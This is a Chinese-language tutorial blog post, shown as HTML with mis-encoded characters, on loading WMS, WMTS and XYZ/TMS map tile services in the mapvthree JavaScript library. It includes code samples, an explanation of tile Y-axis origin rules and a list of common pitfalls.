a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦åŠ è½½å„ç§æ ‡å‡†åœ°å›¾æœåŠ¡ï¼Œæ¯”å¦‚ WMSã€WMTSï¼Œæˆ–è€…è‡ªå®šä¹‰çš„ XYZ æ ¼å¼ç“¦ç‰‡ã€‚ä»Šå¤©å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•åœ¨ mapvthree ä¸­ä½¿ç”¨è¿™äº›æœåŠ¡ï¼Œä»¥åŠç†è§£ä¸åŒçš„ç“¦ç‰‡åˆ‡å›¾è§„åˆ™ã€‚</p>
</blockquote>
<h2 data-id="heading-0">äº†è§£æ ‡å‡†åœ°å›¾æœåŠ¡</h2>
<p>åœ¨ GIS é¢†åŸŸï¼Œæœ‰å‡ ç§å¸¸è§çš„åœ°å›¾æœåŠ¡æ ‡å‡†ï¼š</p>
<ul>
<li><strong>WMSï¼ˆWeb Map Serviceï¼‰</strong>ï¼šWeb åœ°å›¾æœåŠ¡ï¼Œé€šè¿‡ HTTP è¯·æ±‚è·å–åœ°å›¾å›¾ç‰‡</li>
<li><strong>WMTSï¼ˆWeb Map Tile Serviceï¼‰</strong>ï¼šWeb åœ°å›¾ç“¦ç‰‡æœåŠ¡ï¼Œæä¾›é¢„åˆ‡å¥½çš„ç“¦ç‰‡</li>
<li><strong>XYZ</strong>ï¼šé€šç”¨çš„ç“¦ç‰‡æ ¼å¼ï¼Œé€šè¿‡ URL æ¨¡æ¿ç›´æ¥è®¿é—®ç“¦ç‰‡</li>
</ul>
<p><strong>æˆ‘çš„ç†è§£</strong>ï¼šWMS æ˜¯åŠ¨æ€ç”Ÿæˆåœ°å›¾å›¾ç‰‡ï¼ŒWMTS å’Œ XYZ æ˜¯ä½¿ç”¨é¢„åˆ‡å¥½çš„ç“¦ç‰‡ï¼Œæ€§èƒ½æ›´å¥½ã€‚</p>
<h2 data-id="heading-1">ç¬¬ä¸€æ­¥ï¼šåŠ è½½ WMS æœåŠ¡</h2>
<p>WMS æ˜¯ OGC æ ‡å‡†çš„ Web åœ°å›¾æœåŠ¡ï¼Œé€šè¿‡å‚æ•°åŒ–çš„ HTTP è¯·æ±‚è·å–åœ°å›¾å›¾ç‰‡ã€‚</p>
<h3 data-id="heading-2">åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> mapvthree <span class="hljs-keyword">from</span> <span class="hljs-string">'@baidumap/mapv-three'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container'</span>);

<span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">map</span>: {
        <span class="hljs-attr">center</span>: [<span class="hljs-number">120.628</span>, <span class="hljs-number">27.786</span>],
        <span class="hljs-attr">range</span>: <span class="hljs-number">500000</span>,
        <span class="hljs-attr">provider</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">projection</span>: <span class="hljs-string">'EPSG:3857'</span>,
    },
});

<span class="hljs-comment">// æ·»åŠ  WMS æœåŠ¡</span>
<span class="hljs-keyword">const</span> mapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">WMSImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://ows.mundialis.de/services/service'</span>,
        <span class="hljs-attr">params</span>: {
            <span class="hljs-attr">LAYERS</span>: <span class="hljs-string">'TOPO-WMS,OSM-Overlay-WMS'</span>,
            <span class="hljs-attr">SRS</span>: <span class="hljs-string">'EPSG:3857'</span>,
            <span class="hljs-attr">VERSION</span>: <span class="hljs-string">'1.1.1'</span>,
            <span class="hljs-attr">WIDTH</span>: <span class="hljs-number">256</span>,
            <span class="hljs-attr">HEIGHT</span>: <span class="hljs-number">256</span>,
        },
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„å‘ç°</strong>ï¼šWMS éœ€è¦é…ç½®æœåŠ¡ URL å’Œè¯·æ±‚å‚æ•°ï¼ŒåŒ…æ‹¬å›¾å±‚åç§°ã€åæ ‡ç³»ã€ç‰ˆæœ¬ç­‰ã€‚</p>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>url</code>ï¼šWMS æœåŠ¡åœ°å€</li>
<li><code>params.LAYERS</code>ï¼šè¦åŠ è½½çš„å›¾å±‚åç§°ï¼Œå¤šä¸ªå›¾å±‚ç”¨é€—å·åˆ†éš”</li>
<li><code>params.SRS</code>ï¼šç©ºé—´å‚è€ƒç³»ç»Ÿï¼Œå¸¸ç”¨ <code>EPSG:3857</code>ï¼ˆWeb å¢¨å¡æ‰˜ï¼‰æˆ– <code>EPSG:4326</code>ï¼ˆWGS84ï¼‰</li>
<li><code>params.VERSION</code>ï¼šWMS ç‰ˆæœ¬ï¼Œå¸¸ç”¨ <code>1.1.1</code> æˆ– <code>1.3.0</code></li>
<li><code>params.WIDTH</code> å’Œ <code>params.HEIGHT</code>ï¼šè¯·æ±‚å›¾ç‰‡çš„å°ºå¯¸ï¼Œé€šå¸¸ä¸º 256</li>
</ul>
<h2 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šåŠ è½½ WMTS æœåŠ¡</h2>
<p>WMTS æ˜¯ OGC æ ‡å‡†çš„ Web åœ°å›¾ç“¦ç‰‡æœåŠ¡ï¼Œæä¾›é¢„åˆ‡å¥½çš„ç“¦ç‰‡ï¼Œæ€§èƒ½æ¯” WMS æ›´å¥½ã€‚</p>
<h3 data-id="heading-4">åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> mapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">WMTSImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://mrdata.usgs.gov/mapcache/wmts?LAYER=sgmc2&amp;TILEMATRIX={z}'</span>,
        <span class="hljs-attr">params</span>: {
            <span class="hljs-attr">STYLE</span>: <span class="hljs-string">'default'</span>,
            <span class="hljs-attr">TILEMATRIXSET</span>: <span class="hljs-string">'GoogleMapsCompatible'</span>,
            <span class="hljs-attr">VERSION</span>: <span class="hljs-string">'1.0.0'</span>,
            <span class="hljs-attr">FORMAT</span>: <span class="hljs-string">'image/png'</span>,
        },
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„å‘ç°</strong>ï¼šWMTS çš„ URL ä¸­å¯ä»¥ä½¿ç”¨ <code>{z}</code> å ä½ç¬¦ï¼Œå¼•æ“ä¼šè‡ªåŠ¨æ›¿æ¢ä¸ºå¯¹åº”çš„ç¼©æ”¾çº§åˆ«ã€‚</p>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>url</code>ï¼šWMTS æœåŠ¡åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ <code>{z}</code>ã€<code>{x}</code>ã€<code>{y}</code> å ä½ç¬¦</li>
<li><code>params.STYLE</code>ï¼šå›¾å±‚æ ·å¼</li>
<li><code>params.TILEMATRIXSET</code>ï¼šç“¦ç‰‡çŸ©é˜µé›†ï¼Œå¸¸ç”¨ <code>GoogleMapsCompatible</code></li>
<li><code>params.VERSION</code>ï¼šWMTS ç‰ˆæœ¬ï¼Œé€šå¸¸ä¸º <code>1.0.0</code></li>
<li><code>params.FORMAT</code>ï¼šå›¾ç‰‡æ ¼å¼ï¼Œå¦‚ <code>image/png</code>ã€<code>image/jpeg</code></li>
</ul>
<p><strong>æˆ‘çš„ç†è§£</strong>ï¼š</p>
<ul>
<li>WMTS ä½¿ç”¨é¢„åˆ‡å¥½çš„ç“¦ç‰‡ï¼ŒåŠ è½½é€Ÿåº¦æ›´å¿«</li>
<li>URL ä¸­çš„å ä½ç¬¦ä¼šåœ¨è¯·æ±‚æ—¶è¢«æ›¿æ¢ä¸ºå®é™…çš„ç“¦ç‰‡åæ ‡</li>
<li>ä¸åŒçš„ WMTS æœåŠ¡å¯èƒ½æœ‰ä¸åŒçš„å‚æ•°è¦æ±‚</li>
</ul>
<h2 data-id="heading-5">ç¬¬ä¸‰æ­¥ï¼šåŠ è½½ XYZ æ ¼å¼ç“¦ç‰‡</h2>
<p>XYZ æ˜¯æœ€é€šç”¨çš„ç“¦ç‰‡æ ¼å¼ï¼Œé€šè¿‡ URL æ¨¡æ¿ç›´æ¥è®¿é—®ç“¦ç‰‡ï¼Œæ”¯æŒå„ç§è‡ªå®šä¹‰ç“¦ç‰‡æœåŠ¡ã€‚</p>
<h3 data-id="heading-6">åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> mapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://server.arcgisonline.com/ArcGIS/rest/services/'</span> +
              <span class="hljs-string">'World_Topo_Map/MapServer/tile/{z}/{y}/{x}'</span>,
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„å‘ç°</strong>ï¼šXYZ æ ¼å¼ä½¿ç”¨ <code>{z}/{y}/{x}</code> å ä½ç¬¦ï¼Œåˆ†åˆ«ä»£è¡¨ç¼©æ”¾çº§åˆ«ã€è¡Œå·ã€åˆ—å·ã€‚</p>
<h3 data-id="heading-7">åˆ‡å›¾è§„åˆ™ï¼šy å’Œ reverseY</h3>
<p>ä¸åŒçš„ç“¦ç‰‡æœåŠ¡å¯èƒ½ä½¿ç”¨ä¸åŒçš„åˆ‡å›¾è§„åˆ™ï¼Œä¸»è¦ä½“ç°åœ¨ Y è½´çš„èµ·å§‹ä½ç½®ï¼š</p>
<ul>
<li><strong>yï¼ˆé»˜è®¤ï¼‰</strong>ï¼šY è½´ä»å·¦ä¸Šè§’å¼€å§‹ï¼Œå‘ä¸‹é€’å¢ï¼ˆå¦‚è°·æ­Œåœ°å›¾ï¼‰</li>
<li><strong>reverseY</strong>ï¼šY è½´ä»å·¦ä¸‹è§’å¼€å§‹ï¼Œå‘ä¸Šé€’å¢ï¼ˆå¦‚ TMS æ ‡å‡†ï¼‰</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä½¿ç”¨ y è§„åˆ™ï¼ˆå·¦ä¸Šè§’ä¸ºåŸç‚¹ï¼‰</span>
<span class="hljs-keyword">const</span> mapView1 = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://example.com/tiles/{z}/{x}/{y}.png'</span>,
        <span class="hljs-comment">// é»˜è®¤ä½¿ç”¨ y è§„åˆ™</span>
    }),
}));

<span class="hljs-comment">// ä½¿ç”¨ reverseY è§„åˆ™ï¼ˆå·¦ä¸‹è§’ä¸ºåŸç‚¹ï¼ŒTMS æ ‡å‡†ï¼‰</span>
<span class="hljs-keyword">const</span> mapView2 = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://example.com/tms/{z}/{x}/{reverseY}.png'</span>,
        <span class="hljs-comment">// ä½¿ç”¨ reverseY å ä½ç¬¦</span>
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„ç†è§£</strong>ï¼š</p>
<ul>
<li>å¦‚æœç“¦ç‰‡æœåŠ¡ä½¿ç”¨å·¦ä¸Šè§’ä¸ºåŸç‚¹ï¼ˆY å‘ä¸‹é€’å¢ï¼‰ï¼Œä½¿ç”¨ <code>{y}</code></li>
<li>å¦‚æœç“¦ç‰‡æœåŠ¡ä½¿ç”¨å·¦ä¸‹è§’ä¸ºåŸç‚¹ï¼ˆY å‘ä¸Šé€’å¢ï¼ŒTMS æ ‡å‡†ï¼‰ï¼Œä½¿ç”¨ <code>{reverseY}</code></li>
<li>ä½¿ç”¨é”™è¯¯çš„è§„åˆ™ä¼šå¯¼è‡´ç“¦ç‰‡ä½ç½®é”™ä¹±</li>
</ul>
<h3 data-id="heading-8">TMS ç¤ºä¾‹</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> mapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://mapopen-pub-jsapigl.bj.bcebos.com/tms-bj/{z}/{x}/{reverseY}.png'</span>,
        <span class="hljs-attr">startLevel</span>: <span class="hljs-number">7</span>,
        <span class="hljs-attr">maxLevel</span>: <span class="hljs-number">12</span>,
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„å‘ç°</strong>ï¼šå¯ä»¥è®¾ç½® <code>startLevel</code> å’Œ <code>maxLevel</code> æ¥é™åˆ¶ç“¦ç‰‡çš„ç¼©æ”¾çº§åˆ«èŒƒå›´ã€‚</p>
<h2 data-id="heading-9">ç¬¬å››æ­¥ï¼šç†è§£åˆ‡å›¾è§„åˆ™</h2>
<p>ä½œä¸ºä¸€ä¸ªåˆå­¦è€…ï¼Œç†è§£åˆ‡å›¾è§„åˆ™å¾ˆé‡è¦ï¼Œè¿™å†³å®šäº†ç“¦ç‰‡èƒ½å¦æ­£ç¡®æ˜¾ç¤ºã€‚</p>
<h3 data-id="heading-10">åæ ‡ç³»å’ŒåŸç‚¹</h3>
<p>åœ°å›¾ç“¦ç‰‡é€šå¸¸ä½¿ç”¨ä¸¤ç§åæ ‡ç³»ï¼š</p>
<ol>
<li>
<p><strong>å±å¹•åæ ‡ç³»ï¼ˆå·¦ä¸Šè§’åŸç‚¹ï¼‰</strong></p>
<ul>
<li>X è½´ï¼šä»å·¦åˆ°å³é€’å¢</li>
<li>Y è½´ï¼šä»ä¸Šåˆ°ä¸‹é€’å¢</li>
<li>åŸç‚¹åœ¨å·¦ä¸Šè§’</li>
<li>å¦‚ï¼šè°·æ­Œåœ°å›¾ã€OpenStreetMap</li>
</ul>
</li>
<li>
<p><strong>åœ°ç†åæ ‡ç³»ï¼ˆå·¦ä¸‹è§’åŸç‚¹ï¼‰</strong></p>
<ul>
<li>X è½´ï¼šä»å·¦åˆ°å³é€’å¢</li>
<li>Y è½´ï¼šä»ä¸‹åˆ°ä¸Šé€’å¢</li>
<li>åŸç‚¹åœ¨å·¦ä¸‹è§’</li>
<li>å¦‚ï¼šTMSï¼ˆTile Map Serviceï¼‰æ ‡å‡†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">å¦‚ä½•åˆ¤æ–­ä½¿ç”¨å“ªç§è§„åˆ™</h3>
<p><strong>æˆ‘çš„ç»éªŒ</strong>ï¼š</p>
<ol>
<li>æŸ¥çœ‹æœåŠ¡æ–‡æ¡£ï¼Œé€šå¸¸ä¼šè¯´æ˜ä½¿ç”¨çš„åˆ‡å›¾è§„åˆ™</li>
<li>å¦‚æœæ–‡æ¡£æ²¡æœ‰è¯´æ˜ï¼Œå¯ä»¥å°è¯•ä¸¤ç§è§„åˆ™ï¼Œçœ‹å“ªç§æ˜¾ç¤ºæ­£ç¡®</li>
<li>å¸¸è§çš„æœåŠ¡ï¼š
<ul>
<li>è°·æ­Œåœ°å›¾ã€OpenStreetMapï¼šä½¿ç”¨ <code>y</code></li>
<li>TMS æ ‡å‡†æœåŠ¡ï¼šä½¿ç”¨ <code>reverseY</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">ç“¦ç‰‡åæ ‡è®¡ç®—</h3>
<p><strong>æˆ‘çš„ç†è§£</strong>ï¼š</p>
<ul>
<li><code>z</code>ï¼šç¼©æ”¾çº§åˆ«ï¼Œæ•°å€¼è¶Šå¤§ï¼Œåœ°å›¾è¶Šè¯¦ç»†</li>
<li><code>x</code>ï¼šç“¦ç‰‡çš„åˆ—å·ï¼Œä» 0 å¼€å§‹</li>
<li><code>y</code>ï¼šç“¦ç‰‡çš„è¡Œå·ï¼Œä» 0 å¼€å§‹</li>
<li>åœ¨ç¼©æ”¾çº§åˆ« z ä¸‹ï¼Œæ€»å…±æœ‰ <code>2^z Ã— 2^z</code> ä¸ªç“¦ç‰‡</li>
</ul>
<h2 data-id="heading-13">ç¬¬äº”æ­¥ï¼šå®Œæ•´ç¤ºä¾‹</h2>
<p>æˆ‘æƒ³å†™ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºä¸‰ç§æœåŠ¡çš„ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> mapvthree <span class="hljs-keyword">from</span> <span class="hljs-string">'@baidumap/mapv-three'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container'</span>);

<span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">map</span>: {
        <span class="hljs-attr">center</span>: [<span class="hljs-number">120.628</span>, <span class="hljs-number">27.786</span>],
        <span class="hljs-attr">range</span>: <span class="hljs-number">500000</span>,
        <span class="hljs-attr">provider</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">projection</span>: <span class="hljs-string">'EPSG:3857'</span>,
    },
});

<span class="hljs-comment">// ç¤ºä¾‹ 1ï¼šWMS æœåŠ¡</span>
<span class="hljs-keyword">const</span> wmsMapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">WMSImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://ows.mundialis.de/services/service'</span>,
        <span class="hljs-attr">params</span>: {
            <span class="hljs-attr">LAYERS</span>: <span class="hljs-string">'TOPO-WMS'</span>,
            <span class="hljs-attr">SRS</span>: <span class="hljs-string">'EPSG:3857'</span>,
            <span class="hljs-attr">VERSION</span>: <span class="hljs-string">'1.1.1'</span>,
            <span class="hljs-attr">WIDTH</span>: <span class="hljs-number">256</span>,
            <span class="hljs-attr">HEIGHT</span>: <span class="hljs-number">256</span>,
        },
    }),
}));

<span class="hljs-comment">// ç¤ºä¾‹ 2ï¼šWMTS æœåŠ¡</span>
<span class="hljs-keyword">const</span> wmtsMapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">WMTSImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://mrdata.usgs.gov/mapcache/wmts?LAYER=sgmc2&amp;TILEMATRIX={z}'</span>,
        <span class="hljs-attr">params</span>: {
            <span class="hljs-attr">STYLE</span>: <span class="hljs-string">'default'</span>,
            <span class="hljs-attr">TILEMATRIXSET</span>: <span class="hljs-string">'GoogleMapsCompatible'</span>,
            <span class="hljs-attr">VERSION</span>: <span class="hljs-string">'1.0.0'</span>,
            <span class="hljs-attr">FORMAT</span>: <span class="hljs-string">'image/png'</span>,
        },
    }),
}));

<span class="hljs-comment">// ç¤ºä¾‹ 3ï¼šXYZ æ ¼å¼ï¼ˆy è§„åˆ™ï¼‰</span>
<span class="hljs-keyword">const</span> xyzMapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://server.arcgisonline.com/ArcGIS/rest/services/'</span> +
              <span class="hljs-string">'World_Topo_Map/MapServer/tile/{z}/{y}/{x}'</span>,
    }),
}));

<span class="hljs-comment">// ç¤ºä¾‹ 4ï¼šXYZ æ ¼å¼ï¼ˆreverseY è§„åˆ™ï¼ŒTMSï¼‰</span>
<span class="hljs-keyword">const</span> tmsMapView = engine.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">MapView</span>({
    <span class="hljs-attr">imageryProvider</span>: <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">XYZImageryTileProvider</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://mapopen-pub-jsapigl.bj.bcebos.com/tms-bj/{z}/{x}/{reverseY}.png'</span>,
        <span class="hljs-attr">startLevel</span>: <span class="hljs-number">7</span>,
        <span class="hljs-attr">maxLevel</span>: <span class="hljs-number">12</span>,
    }),
}));
</code></pre>
<p><strong>æˆ‘çš„æ„Ÿå—</strong>ï¼šæŒæ¡äº†è¿™ä¸‰ç§æœåŠ¡çš„ä½¿ç”¨æ–¹æ³•ï¼Œå°±å¯ä»¥åŠ è½½å„ç§æ ‡å‡†åœ°å›¾æœåŠ¡äº†ï¼</p>
<h2 data-id="heading-14">ç¬¬å…­æ­¥ï¼šè¸©è¿‡çš„å‘</h2>
<p>ä½œä¸ºä¸€ä¸ªåˆå­¦è€…ï¼Œæˆ‘è¸©äº†ä¸å°‘å‘ï¼Œè®°å½•ä¸‹æ¥é¿å…å†çŠ¯ï¼š</p>
<h3 data-id="heading-15">å‘ 1ï¼šWMS åœ°å›¾ä¸æ˜¾ç¤º</h3>
<p><strong>åŸå› </strong>ï¼šå‚æ•°é…ç½®é”™è¯¯ï¼Œæ¯”å¦‚å›¾å±‚åç§°ä¸å¯¹ã€åæ ‡ç³»ä¸åŒ¹é…ã€‚</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<ol>
<li>æ£€æŸ¥ WMS æœåŠ¡çš„ GetCapabilities æ–‡æ¡£ï¼Œç¡®è®¤æ­£ç¡®çš„å‚æ•°</li>
<li>ç¡®ä¿ <code>SRS</code> å‚æ•°ä¸å¼•æ“çš„æŠ•å½±è®¾ç½®ä¸€è‡´</li>
<li>ç¡®è®¤ <code>LAYERS</code> å‚æ•°ä¸­çš„å›¾å±‚åç§°æ­£ç¡®</li>
</ol>
<h3 data-id="heading-16">å‘ 2ï¼šWMTS ç“¦ç‰‡ä½ç½®é”™ä¹±</h3>
<p><strong>åŸå› </strong>ï¼šURL å ä½ç¬¦ä½¿ç”¨é”™è¯¯ï¼Œæˆ–è€… <code>TILEMATRIXSET</code> ä¸åŒ¹é…ã€‚</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<ol>
<li>ç¡®è®¤ URL ä¸­çš„å ä½ç¬¦æ ¼å¼æ­£ç¡®ï¼ˆ<code>{z}</code>ã€<code>{x}</code>ã€<code>{y}</code>ï¼‰</li>
<li>æ£€æŸ¥ <code>TILEMATRIXSET</code> æ˜¯å¦ä¸æœåŠ¡æä¾›çš„ä¸€è‡´</li>
<li>æŸ¥çœ‹æœåŠ¡çš„ GetCapabilities æ–‡æ¡£</li>
</ol>
<h3 data-id="heading-17">å‘ 3ï¼šXYZ ç“¦ç‰‡ä¸Šä¸‹é¢ å€’</h3>
<p><strong>åŸå› </strong>ï¼šåˆ‡å›¾è§„åˆ™é€‰æ‹©é”™è¯¯ï¼Œåº”è¯¥ç”¨ <code>y</code> å´ç”¨äº† <code>reverseY</code>ï¼Œæˆ–è€…ç›¸åã€‚</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<ol>
<li>æŸ¥çœ‹æœåŠ¡æ–‡æ¡£ï¼Œç¡®è®¤ä½¿ç”¨çš„åˆ‡å›¾è§„åˆ™</li>
<li>å¦‚æœæ–‡æ¡£æ²¡æœ‰è¯´æ˜ï¼Œå°è¯•ä¸¤ç§è§„åˆ™ï¼Œçœ‹å“ªç§æ˜¾ç¤ºæ­£ç¡®</li>
<li>è®°ä½ï¼šå·¦ä¸Šè§’åŸç‚¹ç”¨ <code>y</code>ï¼Œå·¦ä¸‹è§’åŸç‚¹ç”¨ <code>reverseY</code></li>
</ol>
<h3 data-id="heading-18">å‘ 4ï¼šç“¦ç‰‡åŠ è½½å¾ˆæ…¢</h3>
<p><strong>åŸå› </strong>ï¼šæœåŠ¡åœ°å€è®¿é—®æ…¢ï¼Œæˆ–è€…ç½‘ç»œé—®é¢˜ã€‚</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<ol>
<li>æ£€æŸ¥æœåŠ¡åœ°å€æ˜¯å¦å¯è®¿é—®</li>
<li>è€ƒè™‘ä½¿ç”¨ CDN åŠ é€Ÿ</li>
<li>å¯¹äºè‡ªå®šä¹‰æœåŠ¡ï¼Œç¡®ä¿æœåŠ¡å™¨æ€§èƒ½è¶³å¤Ÿ</li>
</ol>
<h3 data-id="heading-19">å‘ 5ï¼šæŸäº›ç¼©æ”¾çº§åˆ«æ²¡æœ‰ç“¦ç‰‡</h3>
<p><strong>åŸå› </strong>ï¼šæœåŠ¡åªæä¾›äº†ç‰¹å®šç¼©æ”¾çº§åˆ«çš„ç“¦ç‰‡ã€‚</p>
<p><strong>è§£å†³</strong>ï¼šä½¿ç”¨ <code>startLevel</code> å’Œ <code>maxLevel</code> é™åˆ¶ç¼©æ”¾çº§åˆ«èŒƒå›´ã€‚</p>
<h2 data-id="heading-20">æˆ‘çš„å­¦ä¹ æ€»ç»“</h2>
<p>ç»è¿‡è¿™ä¸€å¤©çš„å­¦ä¹ ï¼Œæˆ‘æŒæ¡äº†ï¼š</p>
<ol>
<li><strong>WMS æœåŠ¡</strong>ï¼šåŠ¨æ€ç”Ÿæˆåœ°å›¾å›¾ç‰‡ï¼Œéœ€è¦é…ç½®æœåŠ¡ URL å’Œè¯·æ±‚å‚æ•°</li>
<li><strong>WMTS æœåŠ¡</strong>ï¼šä½¿ç”¨é¢„åˆ‡å¥½çš„ç“¦ç‰‡ï¼Œæ€§èƒ½æ›´å¥½ï¼Œæ”¯æŒ URL å ä½ç¬¦</li>
<li><strong>XYZ æ ¼å¼</strong>ï¼šæœ€é€šç”¨çš„ç“¦ç‰‡æ ¼å¼ï¼Œæ”¯æŒè‡ªå®šä¹‰æœåŠ¡</li>
